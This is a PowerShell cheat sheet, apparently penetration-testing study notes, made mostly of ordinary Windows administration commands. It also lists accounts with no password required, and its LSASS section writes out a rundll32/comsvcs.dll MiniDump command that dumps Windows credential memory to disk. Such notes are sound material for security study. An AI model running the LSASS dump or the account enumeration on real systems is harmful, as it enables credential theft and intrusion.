
> [!NOTE] Common Verbs
>  Get
>  Start
>  Stop
>  Read
>  Write
>  New
>  Out



```powershell
gci -Path C:\ -Recurse -Filter "*interesting-file*"
Get-ChildItem -Path C:\ -Recurse -Filter "interesting-file.txt" -ErrorAction SilentlyContinue
```
Count things
```powershell
Get-Command -CommandType Cmdlet
(Get-Command -CommandType Function).Count
```

Get hash values
```powershell
Get-FileHash -Path "C:\Users\YourName\Documents\example.txt" -Algorithm MD5
```

B64 Decode
```powershell
$b64code = Get-Content .\b64.txt

[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($b64code))
```


Get-Users/Groups
```powershell
#Local
Get-localuser
Get-LocalUser | Select-Object Name, SID

Get-LocalGroup

#Password set to False
Get-LocalUser | Where-Object { $_.PasswordRequired -eq $false } | Select-Object Name, PasswordRequired

Get-ADUser -Filter { PasswordNotRequired -eq $true } -Properties PasswordNotRequired | Select-Object Name, PasswordNotRequired

#AD
Import-Module ActiveDirectory
Get-ADUser -Filter *
Get-ADUser -Identity "YourDomainUser" | Select-Object Name, SID

```

Networking
```powershell
Get-NetIPAddress

(Get-NetTCPConnection -State Listen).Count


Get-NetTCPConnection -LocalPort 445 -State Established | Select-Object -Property RemoteAddress

#Simple Port Scanner
Get-NetTCPConnection -State Listen | Select-Object -Property LocalAddress, LocalPort, State

```

Patching
```powershell
get-hotfix
```


#### Finding LSASS PID in PowerShell
```powershell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

#### Create LSASS.dmp 
[[Password-Attacks]] [[Attack-LSASS]]
```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

### Recursive Search for a Specific File(Powershell)
[[Basics]] [[SMB]] 
```powershell
{ !$PsIsContainer -and [System.IO.Path]::GetFileNameWithoutExtension($_.Name) -eq "secret" }
```